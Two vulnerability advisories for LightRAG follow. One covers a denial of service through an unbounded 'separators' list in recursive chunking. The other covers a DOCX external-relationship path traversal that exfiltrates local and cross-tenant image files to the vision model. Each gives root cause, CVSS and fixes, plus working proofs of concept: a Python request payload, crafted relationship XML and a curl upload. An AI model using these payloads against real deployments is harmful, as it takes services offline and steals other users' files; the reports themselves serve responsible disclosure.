summary: Uncontrolled resource consumption: an unbounded `separators` list on `POST /documents/text` drives synchronous recursive chunking on the asyncio event loop
description:
## Summary

`RecursiveCharacterChunkParams.separators` is a request-supplied `list[str]` with no length bound of any kind. The recursive-character chunker descends one recursion level per remaining separator, and at every level it re-runs `re.search`, `re.finditer` and a whole-text `tokenizer.encode`. Total work is `O(len(separators) x len(text))` with both factors controlled by the request body.

The chunker is then invoked synchronously inside an `async def` (`lightrag/pipeline.py:2317-2328`), with no `asyncio.to_thread`, so the entire burn runs on the asyncio event loop and the HTTP server stops answering anything for its duration.

`POST /documents/text` has no body-size limit at all, so `len(text)` is unbounded: `MAX_UPLOAD_SIZE` is enforced only on the multipart upload route.

Demonstrated impact against a live `lightrag-server` in its default configuration: one 414,221-byte `POST /documents/text` was answered `200 OK` in 0.001609 s, and the next `GET /health` took 63.120969 s against a baseline of about 1.5 ms. The request that causes the freeze completes before the freeze starts.

Preconditions, stated here rather than buried: default configuration, no environment variables set. Every route is behind `Depends(combined_auth)`, which in the shipped default (no `LIGHTRAG_API_KEY`, no `AUTH_ACCOUNTS`) admits everyone, so this is reachable pre-authentication as shipped. That default is an existing published advisory and is not re-reported here; it is only the precondition. With an API key configured this becomes an authenticated denial of service, which is still meaningful because any read-only API-key holder can stop the whole service with a single request.

## Severity / CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H`

Score: 7.5 (High).

`PR:N` is scored for the shipped default configuration described above, where `combined_auth` admits every caller. In a deployment with `LIGHTRAG_API_KEY` or `AUTH_ACCOUNTS` configured the correct vector is `PR:L` (6.5, Medium), because any credential holder, including a read-only one, can still trigger it. `AC:L` because the payload is a single JSON POST with no timing, no race and no per-target tuning: the same body works against any deployment. `A:H` because the loss is total rather than partial: the event loop is the single thread serving every route, so `GET /health`, which needs no authentication and touches no storage, is blocked for the whole interval. `C:N`/`I:N` because nothing is read or written beyond the attacker's own submitted document.

CWE-1050 (Excessive Platform Resource Consumption within a Loop), CWE-770 (Allocation of Resources Without Limits or Throttling), CWE-674 (Uncontrolled Recursion).

## Affected component

- `lightrag/api/routers/document_routes.py:293-294` `class RecursiveCharacterChunkParams(_OverlapChunkParams)` with `separators: Optional[list[str]] = None`, no `max_length` and no per-element length bound
- `lightrag/api/routers/document_routes.py:1887` `chunk_options[strategy_key].update(chunking.params)`, where the raw list is copied into the resolved snapshot
- `lightrag/api/routers/document_routes.py:1893` `_validate_effective_chunk_overlap` and `:1937` `_validate_effective_semantic_amount`, the only two effective-value validators, neither of which inspects `separators`
- `lightrag/api/routers/document_routes.py:2837` `insert_text`, `:2899` `_resolve_text_chunking`, `:2906-2918` the `_indexing_task` that calls `pipeline_index_texts` (`:1965`)
- `lightrag/api/routers/document_routes.py:457-467` `InsertTextsRequest`, a `list[str]` of texts with `min_length=1` and no `max_length`, sharing one `chunking` config
- `lightrag/pipeline.py:2120` `async def process_single_document`
- `lightrag/pipeline.py:2317-2328` the `R` branch calling `chunking_by_recursive_character` synchronously, no `asyncio.to_thread`
- `lightrag/pipeline.py:2340` the `V` branch, `await chunking_by_semantic_vector(...)`, which is the awaited counterexample in the same `if`/`elif` chain
- `lightrag/chunker/recursive_character.py:344` entry into `_split_text_with_spans`
- `lightrag/chunker/recursive_character.py:210-289` `_split_text_with_spans`, with the self-recursion at `:266`, the per-split `length_function` call at `:247`, and `re.search` at `:230`
- `lightrag/chunker/recursive_character.py:54` `re.finditer` and `:76-95` the `keep_separator` branch that produces the no-op split
- `lightrag/chunker/recursive_character.py:325-326` `length_function`, a full `tokenizer.encode` over the text handed to it
- `lightrag/api/routers/document_routes.py:2694` and `:2766` the only `max_upload_size` checks, both on the multipart route
- `lightrag/api/lightrag_server.py:1389` and `:1409` the complete set of registered middleware (`_RootPathNormalizationMiddleware`, itself conditional on `api_prefix`, and `CORSMiddleware`); there is no request-size middleware

Version tested: 1.5.5, api version 0316, commit `79b54271`.

## Root cause

Two facts combine.

1. **The separator cascade is unbounded and nothing validates it.** `RecursiveCharacterChunkParams.separators` (`document_routes.py:294`) is a plain `Optional[list[str]]`. The sibling integer fields in the same model family carry `ge=` bounds; this list carries none, neither on its length nor on the length of its elements. The resolution path copies it through verbatim at `:1887`, and the two effective-value validators that run immediately after, `_validate_effective_chunk_overlap` (`:1893`) and `_validate_effective_semantic_amount` (`:1937`), inspect overlap and breakpoint amounts respectively and never look at `separators`. A list of 100,000 separators is accepted by the real request model and the real resolver, verified below.

2. **The recursive chunker runs on the event loop.** In `process_single_document`, the `R` branch calls `chunking_by_recursive_character(self.tokenizer, content, r_chunk_size, **r_opts)` directly (`pipeline.py:2317-2328`). There is no `asyncio.to_thread` and no executor. The `V` branch eleven lines below (`pipeline.py:2340`) is `await chunking_by_semantic_vector(...)`, so the asymmetry is visible inside a single `if`/`elif` chain. Whatever the recursive chunker spends is spent on the only thread that serves HTTP.

**The amplifier, which is the non-obvious part.** A long separator list alone would not be expensive if each level actually split the text. It does not.

`RecursiveCharacterTextSplitter`'s `keep_separator` default is `True` (verified below). With `keep_separator` truthy and not `"end"`, `_split_text_with_regex_spans` (`recursive_character.py:76-95`) walks the matches and emits, for the final match, the slice `text[match.start():len(text)]`. When the separator matches exactly once, at offset 0, that final match is also the first: `first.start() > 0` is false so no prefix piece is emitted (`:78-81`), and the loop emits one piece, `text[0:len(text)]`, the entire input unchanged.

So a payload whose first character is the separator, and which contains that separator nowhere else, produces a split that is a no-op. The single piece is still over `chunk_size`, so `:247` sends it down the `else` branch and `:266` recurses with `separators[index+1:]` (computed at `:232`) and the full text. On the next level the next separator matches at offset 0 in the same way, and the descent repeats. Every level re-runs `re.search` (`:230`), `re.finditer` (`:54`) and `length_function` (`:247`), which is a whole-text `tokenizer.encode` (`:325-326`). Total work is `O(len(separators) x len(text))`.

**The enabling precondition on size.** `len(text)` is unbounded because `POST /documents/text` has no body-size limit. `MAX_UPLOAD_SIZE` (`config.py` default 104857600) is checked in exactly two places, `document_routes.py:2694` (pre-flight on `file.size`) and `:2766` (during the streaming write), both inside the multipart `upload_to_input_dir` handler. The JSON text route never consults it, and no size-limiting middleware exists: the only `add_middleware` calls in `lightrag_server.py` are `_RootPathNormalizationMiddleware` at `:1389` (itself conditional on a non-empty `api_prefix`) and `CORSMiddleware` at `:1409`.

**The multiplier.** `POST /documents/texts` accepts a `list[str]` of texts (`document_routes.py:457-460`) sharing a single `chunking` config (`:464-467`). The list has `min_length=1` and no `max_length`, so one request can carry many texts, each of which pays the full cascade. [INFERENCE] The multiplication of the measured per-text cost by the list length was not separately measured.

## Impact

- **A single request freezes the entire API for a minute.** Against a live `lightrag-server` (uvicorn, single process, default config), a 414,221-byte `POST /documents/text` was answered `200 OK` in 0.001609 s. The next `GET /health`, a route that requires no authentication and touches no storage, took 63.120969 s. Baseline `/health` latency on the same server was 0.002194 s, 0.001523 s, 0.001288 s. That is roughly 1.5 ms to 63.1 s for a trivial GET.
- **The response is not the signal.** The POST returns `200` in 1.6 ms and the work happens afterwards in a background task, on the event loop. Nothing in the request/response exchange tells an operator or a rate limiter that a minute of total unavailability has just been queued.
- **Cost is linear in both request-controlled knobs.** Measured against the real chunker on 204,801 bytes of content: 50 separators 1.51 s, 200 separators 5.92 s, 500 separators 14.91 s, 900 separators 26.67 s. Holding separators at 900 and doubling the text: 409,601 bytes 53.59 s, 819,201 bytes 108.16 s.
- **All of that work is pure waste.** Every run in the sweep above produced `chunks=1`. The recursion does not split anything; it re-tokenizes the same text once per separator and then emits the input as a single chunk.
- **The amplification factor is large against the honest baselines.** The identical 409,601-byte text takes 1.09 s with the same `recursive_character` strategy and its default separators, and 0.06 s with the default `fixed_token` chunker. 53.59 / 1.09 is about 49x, and 53.59 / 0.06 is about 890x.
- **The ceiling is set by text size, not by the separator list.** The separator count is capped in practice by Python's recursion limit: 2000 separators against 8,193 bytes of content raised `RecursionError: maximum recursion depth exceeded` after 1.21 s. An attacker simply stays under it at 900, and scales `len(text)` instead, which nothing bounds. [INFERENCE] 8 MB of text at 900 separators extrapolates from the measured 819,201-byte / 108.16 s point to roughly 18 minutes of frozen API per request; that specific figure was not measured.

## Proof of Concept

Environment: LightRAG 1.5.5 at commit `79b54271`, default configuration, no environment variables set, single-process uvicorn.

### The request

```python
import json, requests
text = "Q" + ("X " * (400*512))                 # ~400 KiB, first char is the separator
requests.post("http://TARGET:9621/documents/text", json={
    "text": text,
    "file_source": "sep-bomb.txt",
    "chunking": {"strategy": "recursive_character",
                 "params": {"separators": ["Q"] * 900}},   # 900 < recursionlimit 1000
})
```

`"Q"` appears exactly once in the payload, at offset 0. That is what makes every level of the descent a no-op.

### The request model and the resolver accept it

Real `InsertTextRequest` and real `_resolve_text_chunking`:

```
model validated OK; separators len = 900
process_options = R
resolved separators len = 900
resolved size/overlap = 1200 100
100k separators accepted: 100000
```

### The splitter defaults that make the split a no-op

```
keep_separator default = True
is_separator_regex default = False
```

### Real chunker, cost linear in both knobs, one chunk every time

```
separators=   50 content=  204801B wall=   1.51s chunks=1
separators=  200 content=  204801B wall=   5.92s chunks=1
separators=  500 content=  204801B wall=  14.91s chunks=1
separators=  900 content=  204801B wall=  26.67s chunks=1
content x2 (400KiB)        separators= 900 content= 409601B wall=  53.59s chunks=1
content x4 (800KiB)        separators= 900 content= 819201B wall= 108.16s chunks=1
over recursion limit       separators=2000 content=   8193B wall=   1.21s RecursionError: maximum recursion depth exceeded
```

`chunks=1` on every row is the point: the entire cost buys nothing.

### Baseline for the identical 400 KiB text

```
default fixed_token:            0.06s chunks=187
recursive default separators:   1.09s chunks=187
```

53.59 / 1.09 is about 49x against the same strategy with default separators, and 53.59 / 0.06 is about 890x against the default chunker. Both baselines produce 187 real chunks; the attack run produces 1.

### Live server, total API unavailability

`/health` needs no authentication and touches no storage, so its latency measures the event loop and nothing else.

```
== baseline /health latency ==
  0.002194s
  0.001523s
  0.001288s
== firing 414KB sep-bomb ==
POST /documents/text -> HTTP 200 in 0.001609s
== /health latency during background chunking ==
  attempt 1: 63.120969s (http 200)
  attempt 2: 0.001480s (http 200)
  ...
```

One 414,221-byte POST, answered `200 OK` in 1.6 ms, made an unrelated trivial GET take 63.12 s. Latency returns to baseline once the chunking finishes, so the outage is exactly as long as the burn.

## Recommended fix

Two independent defects. Both are worth fixing, and fix 2 is the one that matters most.

1. **Bound the cascade.** In `RecursiveCharacterChunkParams` (`document_routes.py:294`), give the field a length bound and a per-element bound, for example `separators: Optional[list[str]] = Field(default=None, max_length=16)` with a per-element `max_length`. This is the same kind of declarative bound the neighbouring fields already carry (`chunk_overlap_token_size: Optional[int] = Field(default=None, ge=0)` at `:272`), so it needs no new validation machinery. Independently, add a recursion-depth counter to `_split_text_with_spans` (`recursive_character.py:210`) that stops descending past a fixed depth and falls through to `final_chunks.append(split)`, the branch that already exists at `:263` for the exhausted-separator case. That makes the chunker safe against any separator list, including ones assembled internally or supplied through `addon_params` rather than through the HTTP model. A cheaper variant of the same guard: if a recursion level produces a single piece byte-identical to its input, the separator did not split anything, so recursing on it with the same text cannot help.

2. **Take chunking off the event loop.** Move every synchronous chunker call in `process_single_document` behind `await asyncio.to_thread(...)`: `pipeline.py:2301` (`chunking_by_paragraph_semantic`), `:2323` (`chunking_by_recursive_character`), `:2361` (`chunking_by_fixed_token`) and `:2409` (`self.chunking_func`, which is caller-supplied and therefore arbitrary). This is not a new pattern for this codebase, it is a pattern already applied to one sibling and not the others. `GHSA-32jh-39m7-8x84` quotes `await asyncio.to_thread(_semantic_groups_with_spans, splitter, content)`: the semantic strategy is already offloaded, and the same asymmetry is visible in `pipeline.py` itself, where the `V` branch at `:2340` is awaited while the `R`, `P` and `F` branches around it are not. The recursive strategy simply was not given the same treatment.

Fix 2 alone downgrades this from "the whole API is down" to "one ingest worker is busy": the pathological chunking still burns a CPU for a minute, but `/health`, `/query`, `/documents` and every other route keep answering. Fix 1 alone removes this particular payload but leaves the structural hazard, because any future expensive chunking path on those four call sites will stall the loop again.

## References

- Version tested: 1.5.5, api version 0316, commit `79b542714732a0396ae2652bc93f93902fd208b2`
- Request model and validation: `lightrag/api/routers/document_routes.py:293-294`, `:457-467`, `:1887`, `:1893`, `:1937`
- Route and task: `lightrag/api/routers/document_routes.py:2837`, `:2899`, `:2906-2918`, `:1965`
- Event loop: `lightrag/pipeline.py:2120`, `:2301`, `:2317-2328`, `:2340`, `:2361`, `:2409`
- Chunker: `lightrag/chunker/recursive_character.py:54`, `:76-95`, `:210-289` (recursion at `:266`, `length_function` at `:247`, `re.search` at `:230`, `re.escape` at `:226` and `:235`), `:325-326`, `:344`
- No body-size limit on the JSON text route: `lightrag/api/routers/document_routes.py:2694`, `:2766` (multipart only), `lightrag/api/lightrag_server.py:1389`, `:1409` (the complete middleware set)

Distinct from `GHSA-32jh-39m7-8x84` on four axes:

1. **Different field.** That advisory concerns `sentence_split_regex`, a `str` field of `SemanticVectorChunkParams`. This concerns `separators`, a `list[str]` field of `RecursiveCharacterChunkParams`.
2. **Different chunker.** That advisory concerns the semantic strategy, fed to LangChain's `SemanticChunker`. This concerns the `recursive_character` strategy and LightRAG's own `_split_text_with_spans`.
3. **Different mechanism, and specifically not a regex bug.** Every separator is passed through `re.escape` before use, at `recursive_character.py:226` and `:235`, because `is_separator_regex` is `False` and is not exposed through the request model. The compiled pattern is a literal and cannot backtrack. The cost here is a missing bound on the length of the separator cascade interacting with a no-op split under `keep_separator=True`, not catastrophic backtracking.

The path described here is not, which is why a `/health` request that requires no authentication and touches no storage is blocked for 63 s.

The fixes are disjoint: bounding a list length and adding `asyncio.to_thread` at four call sites has no overlap with anything that advisory asks for.

Adjacent advisories that this report does not touch and does not re-claim: `GHSA-mmg5-8x8q-v934` (default `WHITELIST_PATHS` exempting `/api/*`), which is only cited here as the reason the route is reachable pre-authentication in the default profile, and `GHSA-vv3m-f8x4-7377` (IPv6-transition destination bypass in the native markdown image download guard), which concerns destination filtering rather than request size, timeouts or volume.

summary: Path traversal: a DOCX external image relationship `Target` reaches `_resolve_image_path` with no containment check, giving arbitrary local image read
description:
## Summary

The native DOCX parser copies an OOXML image relationship `Target` verbatim when `TargetMode="External"`, and the multimodal analyze stage then treats that string as a filesystem path. `_resolve_image_path` (`lightrag/pipeline.py:3699-3711`) returns an absolute path unchanged, and joins a relative path to `sidecar_dir` without `resolve()` or `is_relative_to()`, so neither an absolute path nor `../../../` is contained. The value originates entirely inside the uploaded `.docx`, in `word/_rels/document.xml.rels`.

The attacker also selects the code path. `resolve_file_parser_directives("quarterly.[native-i].docx")` returns `('native', 'i')` (`lightrag/parser/routing.py:1320`, `parse_process_options` at `:216-236`), so the parser engine and the image-analysis option are both chosen from the filename. No server-side configuration choice is needed for that hop.

Impact splits into two tiers, and the difference matters:

- Tier 1 needs only the ability to upload a document. `read_image_dimensions` (`lightrag/pipeline.py:3745`) runs on the attacker's path before the VLM availability gate at `:3755`, and the three outcomes are reported with distinct messages, so an uploader gets an arbitrary-path existence oracle and, for raster targets, an image-dimension oracle. This works in the shipped default configuration with no environment change.
- Tier 2 is full byte exfiltration of the target file to the configured model, through `candidate.read_bytes()` at `:3762`, base64 at `:3782` and `use_vlm_func(..., image_inputs=[img_payload])` at `:3820`. Tier 2 additionally requires `VLM_PROCESS_ENABLE=true` plus a vision-capable binding. That is not the shipped default (`lightrag/lightrag.py:613-615` defaults `vlm_process_enable` to `False`), but it is the documented and intended configuration for multimodal DOCX ingestion, which is the reason the native DOCX parser emits drawings at all.

Existing input validation does not help. `sanitize_filename` (`lightrag/api/routers/document_routes.py:2678`, defined at `:118`) strips separators, NUL bytes and `..` from the uploaded filename, and never inspects the interior of the package. The payload is inside the `.docx`.

Demonstrated impact: through the real `LightRAG.apipeline_enqueue_documents` plus `apipeline_process_enqueue_documents`, with a recording stub in the VLM role, the base64 blob handed to the model is byte-for-byte equal to a 226 byte file that lives outside `working_dir` and outside `INPUT_DIR`. In a second run, a tenant A sidecar read tenant B's extracted asset bytes, `b'\x89PNG\r\n\x1a\nTENANT-B-CONFIDENTIAL'`, defeating the workspace input-directory isolation built at `document_routes.py:1014-1017`.

## Severity / CVSS

`CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N`

Score: 7.5 (High), scored for Tier 2 in the shipped default authentication posture.

Justification of the metrics that are not self-evident:

- `PR:N` because LightRAG's default configuration has no authentication, so `POST /documents/upload` is reachable unauthenticated. With `AUTH_ACCOUNTS` or `LIGHTRAG_API_KEY` configured, the same attack is `PR:L` (any ordinary document-uploading user, no admin rights), which scores 6.5 (Medium). The multi-tenant cross-workspace read below is the `PR:L` case and is the more interesting one.
- `AC:L` because the payload is a static crafted `.docx` with no race, no guessing and no per-target tuning. The engine and image option are encoded in the filename.
- `UI:N` because the attacker uploads the document, so no second party acts.
- `S:U` because the read stays within the privileges of the server process. It crosses the application's own workspace boundary, not an OS privilege boundary.
- `C:H` because the disclosed content is a file of the attacker's choosing from the server filesystem, including other tenants' extracted document images. `I:N` and `A:N` because nothing is written or degraded.

Preconditions stated plainly, because they bound who is affected:

1. Ability to `POST /documents/upload`, or to drop a file into `INPUT_DIR` and trigger `POST /documents/scan`.
2. For Tier 2 only: `VLM_PROCESS_ENABLE=true` and a vision-capable binding (`VLM_LLM_BINDING` or `LLM_BINDING` in openai, azure_openai, gemini, bedrock, ollama). Not the shipped default.

Tier 1 alone, with no environment change from the shipped default, is `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N`, 5.3 (Medium).

CWE-22 (improper limitation of a pathname to a restricted directory), CWE-610 (externally controlled reference to a resource in another sphere), CWE-200 (exposure of sensitive information to an unauthorized actor).

## Affected component

- `lightrag/pipeline.py:3699-3711` `_resolve_image_path`, the sink: absolute paths returned unchanged, relative paths joined to `sidecar_dir` with no `resolve()` and no `is_relative_to()`
- `lightrag/pipeline.py:3730-3733` `_analyze_drawing` reads `item["path"]` straight from the sidecar and hands it to `_resolve_image_path`
- `lightrag/pipeline.py:3739-3744` the only restriction on the target, an extension gate against `_VLM_RASTER_EXTS` (`:3544`, `{.png, .jpg, .jpeg, .gif, .webp}`)
- `lightrag/pipeline.py:3745-3754` `read_image_dimensions(candidate)` and the `min_image_pixel` comparison, both executed on the attacker's path
- `lightrag/pipeline.py:3755-3760` the VLM availability gate, which runs after the two probes above
- `lightrag/pipeline.py:3762` `candidate.read_bytes()`, `:3782` base64 encoding, `:3785` `source_file`, `:3820-3826` the VLM call carrying `image_inputs`
- `lightrag/parser/docx/drawing_image_extractor.py:222-255` `load_relationships`, which records `Target` and `TargetMode` verbatim from `word/_rels/document.xml.rels`
- `lightrag/parser/docx/drawing_image_extractor.py:336-338` the DrawingML branch: `elif rel_kind == "link": ... attrs["path"] = rel.target`, reached from `<a:blip r:link="..."/>`. This is the branch the end-to-end proof of concept below exercises
- `lightrag/parser/docx/drawing_image_extractor.py:381-383` the VML sibling branch: `if rel.target_mode.lower() == "external": ... attrs["path"] = rel.target`, reached from `v:imagedata`
- `lightrag/parser/docx/drawing_image_extractor.py:86-87` and `:234` the two places that already refuse to treat an `External` relationship as package content
- `lightrag/parser/docx/ir_builder.py:229-233,244` the value becomes `IRDrawing.path_override`, documented at `:203-206` as passed through verbatim
- `lightrag/sidecar/writer.py:525-527` and `:629-630` `path_override` written verbatim as the `path` field of `<doc>.drawings.json`
- `lightrag/parser/routing.py:1320` `resolve_file_parser_directives` and `:216-236` `parse_process_options`, which decode the engine and the `i` flag from the filename
- `lightrag/pipeline.py:3409` and `:4128` where the `i` flag becomes `process_opts.images` and selects the drawings sidecar
- `lightrag/api/routers/document_routes.py:2585-2589` `POST /documents/upload`, the entrypoint
- `lightrag/api/routers/document_routes.py:2678` `sanitize_filename(file.filename, doc_manager.input_dir)`, which inspects the filename only
- `lightrag/api/routers/document_routes.py:1014-1017` `DocumentManager.__init__`, the per-workspace input directory that the relative-target variant reads across
- `lightrag/lightrag.py:613-615` `vlm_process_enable` defaults to `False`

Version tested: 1.5.5, api version 0316, commit `79b542714732a0396ae2652bc93f93902fd208b2`, working tree clean. Every line reference above was re-read at that commit.

## Root cause

Three facts combine.

1. **The path is copied verbatim out of attacker-controlled XML and carried untouched to the sink.** `load_relationships` stores `Target` and `TargetMode` exactly as they appear in `word/_rels/document.xml.rels` (`drawing_image_extractor.py:224-225,247-255`). For a linked image the target becomes the `path` attribute of the `<drawing>` placeholder (`:336-338` for DrawingML, `:381-383` for VML). `ir_builder.py:229-233` promotes it to `IRDrawing.path_override`, with the comment at `:203-206` stating the intent, "pass through verbatim". `writer.py:525-527` and `:629-630` then write it as the `path` field of `<doc>.drawings.json` under the comment "Verbatim external/linked reference, pass through unchanged". Each of those steps is individually deliberate. Nothing in the chain validates, and nothing downstream expects to have to.

2. **The resolver applies no containment.** `_resolve_image_path` returns an absolute path as given, and for a relative path computes `sidecar_dir / path_str` and accepts it if it exists, without calling `resolve()` and without comparing the result against `sidecar_dir`. `../../../` therefore escapes the sidecar directory, the workspace input directory, and `working_dir`.

3. **The trust decision that would prevent this already exists in the same extractor and is not honoured at the sink.** `export_embedded_image` returns `None` for an `External` relationship (`drawing_image_extractor.py:86-87`), and `load_relationships` refuses to resolve a part name for one (`:234`). The extractor's position is that an external relationship has no bytes inside the package, which is correct by definition. The path resolver in `pipeline.py` reverses that position and opens the value as a local file.

The containment check that is missing is already implemented in this codebase, twice, in the file that guards the same upload. `sanitize_filename` computes `(input_dir / clean_name).resolve()` and rejects the result unless `final_path.is_relative_to(input_dir.resolve())` (`document_routes.py:154-156`), and `validate_file_path_security` does the same at `:1105-1146`. The parser and analyze stages use neither.

The result also removes the value of the one control that was applied to this upload. `sanitize_filename` runs on `file.filename` and is effective there (a battery of hostile filenames including backslashes, NUL, overlong and unicode encodings, `....//` and absolute paths was run against it and all were neutralized). It is simply the wrong layer for this payload, which travels inside the archive.

## Impact

- **Full byte exfiltration of a chosen local file to the configured model (Tier 2).** Verified end to end against real `apipeline_enqueue_documents` plus `apipeline_process_enqueue_documents` with a recording stub in the VLM role: 2 VLM invocations carried images, both with `source_file = /tmp/lr-audit/fsaudit/victim_home/id_rsa_screenshot.png`, and `EXFIL MATCHES VICTIM FILE: True` for both. That flag is byte-for-byte equality between the base64 blob handed to the model and a 226 byte file outside `working_dir` and outside `INPUT_DIR`.
- **Cross-tenant read, defeating the workspace input-directory isolation.** With `sidecar_dir` at `/tmp/lr-audit/fsaudit/ws/tenantA/__parsed__/attack.docx.parsed` and a relationship `Target` of `../../../tenantB/__parsed__/victim.docx.parsed/victim.blocks.assets/image1.png`, the resolver returned a path outside tenant A and the bytes read were `b'\x89PNG\r\n\x1a\nTENANT-B-CONFIDENTIAL'`. The workspace scoping at `document_routes.py:1014-1017` is correct as a parameter check and is bypassed from inside a document rather than through that parameter. Every other tenant's extracted document images are readable, and those are exactly the files this feature exists to produce.
- **Arbitrary-path existence oracle with no configuration change at all (Tier 1).** The order of operations is the whole point: the extension gate at `:3739-3744` and `read_image_dimensions` at `:3745` both run before the `vlm_process_enable` check at `:3755`. A path that does not exist yields `image file not found: <path>` from `:3736`; a path that exists but is not raster-suffixed yields `unsupported image format: <ext>` from `:3742`. Those two messages differ, so the existence of any path, image or not, is distinguishable. For a raster-suffixed target that exists, `read_image_dimensions` runs and a small image yields `image width or height is smaller than 64px` (`:3751`, `DEFAULT_MM_IMAGE_MIN_PIXEL = 64` at `constants.py:385`), which is a dimension oracle. The messages are persisted into the sidecar: in the run below, `quarterly.drawings.json` carries `llm_analyze_result.message` for the item. [INFERENCE] The same strings also reach `doc_status`; only the sidecar surfacing was directly observed.
- **The attacker selects the parser engine and the image option, so no operator opt-in is needed to reach the resolver.** `resolve_file_parser_directives('quarterly.[native-i].docx')` returns `('native', 'i')`, confirmed by direct invocation at this commit. `native` routes to the DOCX drawing extractor; `i` sets `process_opts.images` (`pipeline.py:3409`), which selects the drawings sidecar for analysis (`:4128`). Both come from the filename.
- **Existing filename validation is not a mitigation.** `sanitize_filename` at `document_routes.py:2678` never opens the archive. Nothing between the upload handler and `Path.read_bytes` inspects the relationship target.
- **The model's description of the stolen image is persisted and retrievable.** [INFERENCE] Analysis results are written back into the sidecar and indexed, so a successful analysis makes the content of the stolen file retrievable through `/query`. Not directly observed: in the run below the stub returned a payload that failed the response schema check, so `llm_analyze_result.status` was `failure` and no description was indexed. The exfiltration to the model itself is not inferred, it is the measured `EXFIL MATCHES VICTIM FILE: True`.

### Limitations

- The extension gate restricts the byte read to targets whose path ends in `.png`, `.jpg`, `.jpeg`, `.gif` or `.webp`. It is therefore arbitrary *image-suffixed* file read, not arbitrary file read. The gate tests the suffix of the attacker-supplied path, not the file's content, and the `min_image_pixel` comparison is skipped when `read_image_dimensions` returns `None` (`:3746`), so a non-image file that happens to end in `.png` is still read in full.
- `max_image_bytes` (`:3516-3519`, default 5 MiB) caps the exfiltrated size; a larger target is reported as skipped rather than sent.
- The existence oracle in Tier 1 is not limited by extension, because the not-found and unsupported-format messages are distinct.

## Proof of Concept

### The crafted package

`quarterly.[native-i].docx`, an otherwise ordinary DOCX. The filename hint selects engine `native` and process option `i`. `word/_rels/document.xml.rels`:

```xml
<Relationship Id="rId7"
  Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image"
  Target="/home/victim/private/id_rsa_screenshot.png" TargetMode="External"/>
```

`word/document.xml` references it as a linked image inside a `wp:inline` drawing:

```xml
<a:blip r:link="rId7"/>
```

Delivery is a single unauthenticated upload in the default configuration:

```bash
curl -F 'file=@quarterly.[native-i].docx' http://target:9621/documents/upload
```

The cross-tenant variant differs only in the target:

```xml
Target="../../../tenantB/__parsed__/victim.docx.parsed/victim.blocks.assets/image1.png"
TargetMode="External"
```

### (a) End to end through the real pipeline

`poc_e2e_exfil.py` builds the package, calls the real `LightRAG.apipeline_enqueue_documents` and `apipeline_process_enqueue_documents`, and installs a stub in the VLM role that records exactly what it is handed.

```
[+] victim secret at /tmp/lr-audit/fsaudit/victim_home/id_rsa_screenshot.png (226 bytes)
[+] uploaded file: quarterly.[native-i].docx
[+] routing from filename -> engine='native' process_options='i'
INFO: Parsing (native): doc-554516a1c97159cf7952570f36de3c81
INFO: [sidecar] wrote 1 blocks ... (0 tables, 1 drawings, 0 equations, assets=False, engine=native)
INFO: Analyzing multimodal: doc-554516a1c97159cf7952570f36de3c81

[+] input/__parsed__/quarterly.docx.parsed/quarterly.drawings.json:
{
  "drawings": {
    "im-554516a1c97159cf7952570f36de3c81-0001": {
      "format": "png",
      "path": "/tmp/lr-audit/fsaudit/victim_home/id_rsa_screenshot.png",
      ...

[+] VLM invocations carrying images: 2
    source_file = /tmp/lr-audit/fsaudit/victim_home/id_rsa_screenshot.png
    EXFIL MATCHES VICTIM FILE: True
```

`EXFIL MATCHES VICTIM FILE: True` is byte-for-byte equality between the base64 blob handed to the VLM and the contents of a file that lives outside `working_dir` and outside `INPUT_DIR`. The `path` field of the generated sidecar holds the attacker's absolute path verbatim, which is the parser half of the chain confirmed on disk.

### (b) The sink, compiled out of the repository source

`verify_sink_source.py` reads `lightrag/pipeline.py`, slices lines 3699 to 3711, and compiles that text. Nothing is retyped, so the function under test is the shipped one.

```
---- verbatim source lines 3699-3711 of lightrag/pipeline.py ----
def _resolve_image_path(
    path_str: str | None, sidecar_dir: Path
) -> Path | None:
    if not path_str:
        return None
    candidate = Path(path_str)
    if not candidate.is_absolute():
        sidecar_candidate = sidecar_dir / path_str
        if sidecar_candidate.exists() and sidecar_candidate.is_file():
            candidate = sidecar_candidate
    if candidate.exists() and candidate.is_file():
        return candidate
    return None
-----------------------------------------------------------------
'/tmp/lr-audit/fsaudit/secret_outside_root.png'  -> /tmp/lr-audit/fsaudit/secret_outside_root.png
'../../../OUTSIDE/private_screenshot.png'        -> .../report.parsed/../../../OUTSIDE/private_screenshot.png
'/etc/hostname'                                  -> /etc/hostname
```

Three results in one block: an absolute path outside the tree is returned unchanged, a relative `../../../` target escapes the sidecar directory, and `/etc/hostname` is accepted as a resolved image path. `/etc/hostname` is returned by the resolver and is then rejected 29 lines later by the extension gate at `:3740`, which is precisely why the existence oracle in Tier 1 is not limited to images while the byte read is.

### (c) Cross-workspace read

`poc_cross_workspace.py`, same verbatim sink, two workspace directories laid out as `DocumentManager` lays them out.

```
sidecar_dir (tenant A): /tmp/lr-audit/fsaudit/ws/tenantA/__parsed__/attack.docx.parsed
relationship Target   : ../../../tenantB/__parsed__/victim.docx.parsed/victim.blocks.assets/image1.png
resolved outside A    : True
bytes read            : b'\x89PNG\r\n\x1a\nTENANT-B-CONFIDENTIAL'
```

The marker bytes come from a file only tenant B uploaded, in a directory `document_routes.py:1014-1017` scopes to tenant B.

All three results were reproduced at commit `79b54271` while preparing this report.

## Recommended fix

1. **Do not treat an `External` relationship target as a filesystem path.** At `lightrag/parser/docx/drawing_image_extractor.py:381-383` (VML) and `:336-338` (DrawingML, the branch keyed on `rel_kind == "link"`), stop assigning `rel.target` to `attrs["path"]`. A linked image has no bytes inside the package by definition, which is the position the same file already takes twice: `export_embedded_image` returns `None` for `External` at `:86-87`, and `load_relationships` declines to resolve a part name for `External` at `:234`. Honouring that same decision in the path resolver is consistent with the extractor's existing intent rather than a new policy. If the link is worth keeping for display, carry it in a distinct `src` field that no consumer opens, which the IR already has (`IRDrawing.src`, `ir_builder.py:243`), and leave `path` empty.

2. **Enforce containment at the sink.** In `_resolve_image_path` (`lightrag/pipeline.py:3699-3711`), reject absolute paths outright and resolve before use:

   ```python
   candidate = (sidecar_dir / path_str).resolve()
   if not candidate.is_relative_to(sidecar_dir.resolve()):
       return None
   ```

